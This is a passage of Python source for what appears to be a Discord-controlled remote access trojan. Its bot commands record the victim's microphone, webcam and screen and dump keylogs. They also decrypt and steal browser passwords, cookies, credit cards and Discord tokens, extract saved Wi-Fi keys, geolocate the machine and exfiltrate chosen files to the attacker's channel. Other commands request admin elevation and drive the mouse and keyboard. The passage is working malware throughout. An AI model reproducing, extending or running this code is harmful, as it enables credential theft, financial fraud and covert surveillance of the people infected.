                sd.wait()
                write(soundpath, fs, record_voice)
                try:
                    await message.channel.send(file=File(soundpath))
                except discord.errors.HTTPException:
                    await message.channel.send(embed=getfileembed(soundpath))

            if basecommand == "!reccam":
                async def cam():
                    videopath = TEMP + r"\camrecording.mp4"

                    vidcapture = cv2.VideoCapture(0)
                    vidcod = cv2.VideoWriter_fourcc(*'XVID')
                    output = cv2.VideoWriter(videopath, vidcod, 20.0, (640, 480))
                    input2 = 0

                    while True:
                        input2 = input2 + 1
                        input3 = 0.045 * input2
                        ret, frame = vidcapture.read()
                        output.write(frame)
                        if input3 >= int(args[1]):
                            break
                        else:
                            continue
                    vidcapture.release()
                    output.release()

                    video = moviepy.video.io.VideoFileClip.VideoFileClip(videopath)
                    path = TEMP + r"\camvideo.mp4"
                    video.write_videofile(path)

                    try:
                        await message.channel.send(file=File(path))
                    except discord.errors.HTTPException:
                        await message.channel.send(embed=getfileembed(path))

                await asyncio.create_task(cam())

            if basecommand == "!recscreen":
                fps = 24.0
                recordingtime = int(args[1])
                videopath = TEMP + "/video.avi"
                SCREEN_SIZE = tuple(pyautogui.size())

                fourcc = cv2.VideoWriter_fourcc(*"XVID")

                out = cv2.VideoWriter(videopath, fourcc, fps, SCREEN_SIZE)

                for i in range(int(recordingtime * fps)):
                    img = pyautogui.screenshot()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)

                cv2.destroyAllWindows()
                out.release()

                video = moviepy.video.io.VideoFileClip.VideoFileClip(videopath)
                path = videopath.replace(".avi", ".mp4")
                video.write_videofile(path)

                try:
                    await message.channel.send(file=File(path))
                except discord.errors.HTTPException:
                    await message.channel.send(embed=getfileembed(path))

            if basecommand == "!dumpkeylog":
                if not os.path.exists(keylogfile): return
                await message.channel.send(embed=getfileembed(keylogfile))
                os.remove(keylogfile)

            if basecommand == "!browserdata":
                def installedbrowsers():
                    return [x for x in browsers if os.path.exists(f"{x[1]}//Local State")]

                p4ssw0rds = f"{mainfolder}//p4ssw0rds.txt"
                c0okies = f"{mainfolder}//c0okies.txt"
                h1st0ry = f"{mainfolder}//h1st0ry.txt"
                cr3d1tc4rds = f"{mainfolder}//cr3d1tc4rds.txt"
                d0wnloads = f"{mainfolder}//d0wnloads.txt"

                datatypes = {
                    "login_data": p4ssw0rds,
                    "credit_cards": cr3d1tc4rds,
                    "history": h1st0ry,
                    "cookies": c0okies,
                    "downloads": d0wnloads,
                }

                datatypesembeds = {
                    "`🔑 Passwords`": p4ssw0rds,
                    "`🍪 Cookies`": c0okies,
                    "`📜 History`": h1st0ry,
                    "`💳 Credit Cards`": cr3d1tc4rds,
                    "`💾 Downloads`": d0wnloads,
                }

                for p in datatypes.values():
                    if os.path.exists(p):
                        os.remove(p)
                for browser in installedbrowsers():
                    os.system(f"taskkill /f /im {browser[3]}")
                    path = browser[1]
                    key = getkey(path)

                    for data_type_name, data_type in dataqueries.items():
                        datafile = open(datatypes[data_type_name], "a", encoding="utf-8")
                        data = getbrowserdata(path, "Default", key, data_type)
                        if data is not None:
                            if len(data) > 0:
                                try:
                                    datafile.write(data)
                                except UnicodeEncodeError as e:
                                    print(e)
                        datafile.close()

                embed = discord.Embed(color=0x2B2D31)
                embed.set_thumbnail(
                    url=gifs['earth'])

                for e in datatypesembeds.keys():
                    if os.path.getsize(datatypesembeds[e]) > 0:
                        embed.add_field(
                            name="",
                            value=f'`╓` {e}'
                                  f'\n`╟` `🔎 Found: ` `{open(datatypesembeds[e], "r", encoding="utf-8").read().count("╠")}`'
                                  f'\n`╙` [{datatypesembeds[e].split("//")[-1]}]({getfileio(datatypesembeds[e])})',
                            inline=True,
                        )
                embed.set_footer(text=textclientinfo)
                await message.channel.send(embed=embed)

            if basecommand == "!grabdiscord":
                def decryptval(buff, master_key=None):
                    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
                    if starts in ("v10", "v11"):
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted_pass = cipher.decrypt(payload)
                        decrypted_pass = decrypted_pass[:-16].decode()
                        return decrypted_pass

                discordtokens = []

                def getbrowsertokens(path):
                    if not os.path.exists(path):
                        return

                    for file in os.listdir(path):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if
                                         x.strip()]:
                                for regex in (
                                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                                        r"mfa\.[\w-]{80,95}",
                                ):
                                    for token in re.findall(regex, line):
                                        if [path, token] not in discordtokens:
                                            discordtokens.append([path, token])

                def getdiscord(path, arg):
                    if not os.path.exists(f"{path}/Local State"):
                        return

                    pathC = path + arg

                    pathKey = path + "/Local State"
                    with open(pathKey, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = CryptUnprotectData(master_key[5:])
                    for file in os.listdir(pathC):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if
                                         x.strip()]:
                                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                    tokenDecoded = decryptval(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]),
                                                              master_key)
                                    if [path, tokenDecoded] not in discordtokens:
                                        discordtokens.append([path, tokenDecoded])

                def gettokeninfo(token):
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                    }

                    userjson = json.loads(
                        urlopen(
                            Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
                    username = userjson["username"]
                    email = userjson["email"]
                    idd = userjson["id"]
                    pfp = userjson["avatar"]
                    flags = userjson["public_flags"]
                    nitro = ""
                    phone = "-"

                    if "premium_type" in userjson:
                        nitrot = userjson["premium_type"]
                        if nitrot == 1:
                            nitro = f"{emojis['nitro']}"
                        elif nitrot == 2:
                            nitro = f"{emojis['nitro']}"
                    if "phone" in userjson:
                        phone = userjson["phone"]

                    return username, email, idd, pfp, flags, nitro, phone

                for d in discordpaths:
                    getdiscord(d[0], d[1])
                for b in browserdiscordpaths:
                    getbrowsertokens(b[0])
                embedlist = []
                for t in discordtokens:
                    try:
                        accinfo = gettokeninfo(t[1])
                        embed = discord.Embed(color=0x2B2D31)
                        embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{accinfo[2]}/{accinfo[3]}.png")
                        embed.add_field(name=f"<a:Discord_animated_logo:1217194083362013305> Account Info",
                                        value=f"",
                                        inline=False)

                        embed.add_field(name=f"<a:folder:1217194860927385771> Token found in `{t[0]}`",
                                        value=f"```{t[1]}```", inline=False)

                        accinfoembedtypes = [f"• {emojis['user_icon']} `Username:` `{accinfo[0]}`",
                                             f"• {emojis['mail']} `Email:` `{accinfo[1]}`",
                                             f"• {emojis['icons_ping']} `User ID:` `{accinfo[2]}`"]

                        if len(accinfo[5]) > 3: accinfoembedtypes.append(
                            f"• {emojis['nitro']} `Nitro:` {accinfo[5]}")
                        if accinfo[6] is not None: accinfoembedtypes.append(f"• `☎` `Phone:` `{accinfo[6]}`")

                        for fieldtext in accinfoembedtypes: embed.add_field(name=f"", value=fieldtext, inline=True)
                        embedlist.append(embed)
                    except HTTPError:
                        pass
                for e in embedlist: await message.channel.send(embed=e)

            if basecommand == "!upload":
                if os.path.exists(args[1]) and len(message.attachments) > 0:
                    output = ""
                    await message.attachments[0].save(args[1] + r"//" + message.attachments[0].filename)
                    output += f"┏ 📁 File {message.attachments[0].filename}\n"
                    for attachment in message.attachments[1:]:
                        filename = attachment.filename
                        print(filename)
                        savepath = args[1] + r"//" + filename
                        await attachment.save(savepath)
                        output += f"┣ 📁 File {filename}\n"
                    output += f"┗━▶ 📦 Saved to {args[1]}\n"
                    embed = discord.Embed(color=0x2B2D31, title="`📮 File upload succesful!`",
                                          description=f"```{output}```")
                    embed.set_thumbnail(
                        url=list(gifs.values())[random.randrange(0,len(list(gifs.values())))])
                    embed.set_footer(text=textclientinfo)
                    await message.channel.send(embed=embed)

            if basecommand == "!sendfile":
                for path in args[1:]:
                    await message.channel.send(embed=getfileembed(path))

            if basecommand == "!wifi":
                command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                                capture_output=True).stdout.decode()
                profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
                wifi_list = []
                if len(profile_names) != 0:
                    for name in profile_names:
                        wifi_profile = {}
                        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                      capture_output=True).stdout.decode()
                        if re.search("Security key           : Absent", profile_info):
                            continue
                        else:
                            wifi_profile["Wifi"] = name
                            profile_info_pass = subprocess.run(
                                ["netsh", "wlan", "show", "profile", name, "key=clear"],
                                capture_output=True).stdout.decode()
                            password = re.search("Key Content            : (.*)\r", profile_info_pass)
                            if password is None:
                                wifi_profile["Password"] = None
                            else:
                                wifi_profile["Password"] = password[1]

                            wifi_list.append(wifi_profile)

                output = ""
                maxwifilen = max([len(wifi["Wifi"]) for wifi in wifi_list])
                maxpasslen = max([len(wifi["Password"]) for wifi in wifi_list])
                output += "WIFI NAME" + " " * (maxwifilen - len("WIFI NAME") + 1) + "║ " + "PASSWORD\n"
                output += ("═" * maxwifilen + "═╬═" + "═" * maxpasslen + "\n")
                for x in wifi_list:
                    output += (x["Wifi"] + " " * (maxwifilen - len(x['Wifi']) + 1) + "║ " + x["Password"]) + "\n"
                writetofile(output, TEMP + "/wifi.txt")

                await message.channel.send(file=File(TEMP + "/wifi.txt"))

            if basecommand == "!drives":
                def btogb(b):
                    KB = 1000
                    MB = KB * 1000
                    GB = MB * 1000
                    return str(b / GB) + " GB"

                a = ""
                for disk in psutil.disk_partitions():
                    total, used, free = 0, 0, 0
                    if disk.fstype:
                        total += int(psutil.disk_usage(disk.mountpoint).total)
                        used += int(psutil.disk_usage(disk.mountpoint).used)
                        free += int(psutil.disk_usage(disk.mountpoint).free)

                    a += f"```💿 {disk.device} {btogb(total)} TOTAL, {btogb(used)} USED, {btogb(free)} FREE```"
                embed = discord.Embed(color=0x2B2D31, title=f"`💾 Available logical drives:`")
                embed.add_field(
                    name="", value=f"{a}", inline=True
                )
                embed.set_footer(text=textclientinfo)
                await message.channel.send(embed=embed)

            if basecommand == "!geolocate":
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                    embed = discord.Embed(color=0x2B2D31, title=f"`🌎` Location link",
                                          description=f"`🔛 Latitude` `{data['latitude']}`\n`🔝 Longitude:` `{data['longitude']}`")
                    embed.url = link
                    embed.set_footer(text=textclientinfo)
                    embed.set_thumbnail(
                        url="https://cdn.discordapp.com/attachments/942481541068628018/1218294802206953663/output-onlinegiftools.gif?ex=66072473&is=65f4af73&hm=7eee0a5fe9f79114e745f163a98be6aa701d6384563a05ff4f14a60822bbdca7&")
                    await message.channel.send(embed=embed)

            if basecommand == "!findallfiles":
                def findallfiles(directory, keyword):
                    filepaths = []
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if str(keyword).lower() in str(file).lower():
                                filepath = f"{os.path.join(root, file)} {bytestoreadable(os.path.getsize(os.path.join(root, file)))}"
                                filepaths.append(filepath)

                    return filepaths

                keywords = ""
                for keyword in args[2:]: keywords += f"{keyword} "
                stringfilepaths = ""
                filepaths = []
                for keyphrase in args[2:]:
                    filepaths.extend(findallfiles(args[1], keyphrase))
                for filepath in filepaths:
                    stringfilepaths += f"{filepath}\n"
                writetofile(stringfilepaths, f"{TEMP}/filelist.txt")
                embed = discord.Embed(color=0x2B2D31,
                                      description=f"`🔎 Found {len(filepaths)} files!` \n`🔑 Keywords:` `{keywords}` \n`📁 File paths:`")
                embed.set_footer(text=textclientinfo)
                await message.channel.send(embed=embed)
                await message.channel.send(file=File(f"{TEMP}/filelist.txt"))

            if basecommand == "!sendallfiles":
                def findallfiles(directory, keyword):
                    filepaths = []
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if str(keyword).lower() in str(file).lower():
                                filepath = f"{os.path.join(root, file)}"
                                filepaths.append(filepath)

                    return filepaths

                destination = mainfolder + f"\\files"
                zipfilepath = mainfolder + f"\\files.rar"
                if not os.path.exists(destination):
                    os.mkdir(destination)
                filepaths = []
                for keyphrase in args[2:]:
                    filepaths.extend(findallfiles(args[1], keyphrase))
                for filepath in filepaths:
                    shutil.copy2(filepath, destination)

                os.system(f"cd {mainfolder} & tar -cvf files.rar files")

                embed = discord.Embed(color=0x2B2D31,
                                      description=f"`🔎 Found {len(filepaths)} files!` \n`🔑 Keywords:` `{unsplit(args[2:])}` \n`📁 ZIP File:`")
                embed.set_thumbnail(
                    url="https://cdn.discordapp.com/emojis/1216135035233763529.gif?size=96&quality=lossless")
                embed.set_footer(text=textclientinfo)

                await message.channel.send(embed=embed)
                await message.channel.send(embed=getfileembed(zipfilepath))

                shutil.rmtree(destination)
                os.remove(zipfilepath)

            if basecommand == "!uacelevate":
                if not adm1n:
                    pidfile = open(f"{TEMP}//uacelevate.txt", "w")
                    pidfile.write(str(processid))
                    pidfile.close()
                    ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", sys.executable, " ".join(sys.argv), None, 1
                    )

            if basecommand == "!mu":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y - int(args[1]) * 10)
                else:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y - 10 * 10)
            if basecommand == "!md":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y + int(args[1]) * 10)
                else:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y + 10 * 10)
            if basecommand == "!ml":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x - int(args[1]) * 10, pyautogui.position().y)
                else:
                    pyautogui.moveTo(pyautogui.position().x - 10 * 10, pyautogui.position().y)
            if basecommand == "!mr":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x + int(args[1]) * 10, pyautogui.position().y)
                else:
                    pyautogui.moveTo(pyautogui.position().x + 10 * 10, pyautogui.position().y)

            if basecommand == "!lmb":
                pyautogui.leftClick()
            if basecommand == "!rmb":
                pyautogui.rightClick()
            if basecommand == "!write":
                pyautogui.write(args[1])
            if basecommand == "!press":
                pyautogui.press(args[1])
            if basecommand == "!shortcut":
                shortcut(args[2], args[1])


bot.run("TOKEN")
